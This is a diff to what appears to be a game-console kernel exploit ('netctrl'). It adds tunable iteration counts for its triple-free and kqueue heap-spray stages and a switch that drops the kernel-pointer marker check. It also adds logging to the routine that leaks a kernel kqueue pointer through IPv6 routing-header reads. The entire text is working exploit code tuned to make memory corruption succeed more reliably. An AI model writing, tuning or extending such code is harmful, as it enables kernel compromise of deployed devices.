@@ -139,9 +139,28 @@ const MSG_IOV_NUM = 0x17
 const IPV6_SOCK_NUM = 96
 const IOV_THREAD_NUM = 8
 const UIO_THREAD_NUM = 8
-const MAIN_LOOP_ITERATIONS = 3
-const TRIPLEFREE_ITERATIONS = 8
-const KQUEUE_ITERATIONS = 5000
+
+// Debug knobs (override from config.json, e.g. "nc_kqueue_iters": 20000):
+//   nc_main_loop, nc_triplefree, nc_kqueue_iters, nc_kqueue_yield, nc_magic
+// nc_magic = 0 disables the hardcoded marker check: any kernel pointer landing
+// at rthdr+0x98 is accepted (use this when the 0x1430000 marker is stale).
+function knob (key: string, def: number) {
+  try {
+    if (typeof CONFIG !== 'undefined') {
+      const v = (CONFIG as unknown as Record<string, unknown>)[key]
+      if (typeof v === 'number' && v > 0) return Math.floor(v)
+    }
+  } catch (e) { /* default */ }
+  return def
+}
+const MAIN_LOOP_ITERATIONS = knob('nc_main_loop', 3)
+const TRIPLEFREE_ITERATIONS = knob('nc_triplefree', 8)
+const KQUEUE_ITERATIONS = knob('nc_kqueue_iters', 5000)
+const KQUEUE_YIELD = knob('nc_kqueue_yield', 1)
+const LEAK_MAGIC = knob('nc_magic', 0x1430000)
+
+log('[netctrl] knobs main_loop=' + MAIN_LOOP_ITERATIONS + ' triplefree=' + TRIPLEFREE_ITERATIONS +
+  ' kq_iters=' + KQUEUE_ITERATIONS + ' kq_yield=' + KQUEUE_YIELD + ' magic=0x' + LEAK_MAGIC.toString(16))
 
 const MAX_ROUNDS_TWIN = 5
 const MAX_ROUNDS_TRIPLET = 200
@@ -994,7 +1013,7 @@ let exploit_count = 0
 let exploit_end = false
 
 function netctrl_exploit () {
-  setup_log_screen()
+  if (!jsmaf.debug_board) setup_log_screen()
 
   const supported_fw = init()
   if (!supported_fw) {
@@ -1495,28 +1514,46 @@ function leak_kqueue () {
   let kq = new BigInt(0)
 
   // Minimizing footprint
-  const magic_val = new BigInt(0x0, 0x1430000)
+  const magic_val = new BigInt(0x0, LEAK_MAGIC)
   const magic_add = leak_rthdr.add(0x08)
 
   let count = 0
+  let magic_hits = 0
+  let fdp_bad = 0
+  let last_magic = new BigInt(0)
+  let last_fdp = new BigInt(0)
   while (count < KQUEUE_ITERATIONS) {
     kq = kqueue()
 
     // Leak with other rthdr.
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100)
 
-    if (read64(magic_add).eq(magic_val) && !read64(leak_rthdr.add(0x98)).eq(0)) {
-      break
+    last_magic = read64(magic_add)
+    last_fdp = read64(leak_rthdr.add(0x98))
+    const magic_ok = LEAK_MAGIC === 0
+      ? !(last_magic.hi === 0 && last_magic.lo === 0)
+      : last_magic.eq(magic_val)
+    if (magic_ok) {
+      magic_hits++
+      if (!last_fdp.eq(0) && last_fdp.hi === 0xffffffff) break
+      fdp_bad++
     }
 
     close(kq)
-    sched_yield()
+    if (KQUEUE_YIELD) sched_yield()
     count++
   }
   if (count === KQUEUE_ITERATIONS) {
     // Dropped out with no kqueue leak
+    log('[netctrl] leak_kqueue_fdp FAIL iters=' + KQUEUE_ITERATIONS +
+      ' magic=0x' + LEAK_MAGIC.toString(16) + ' magic_hits=' + magic_hits +
+      ' fdp_bad=' + fdp_bad + ' last_magic=' + hex(last_magic) +
+      ' last_fdp=' + hex(last_fdp))
     log('Failed to leak kqueue_fdp')
     return false
+  }
+  if (magic_hits > 1) {
+    log('[netctrl] leak_kqueue_fdp hit after ' + count + ' iters (magic_hits=' + magic_hits + ' fdp_bad=' + fdp_bad + ')')
   }
 
   // kq_fdp = read64(leak_rthdr.add(0xA8)); // PS5 offset
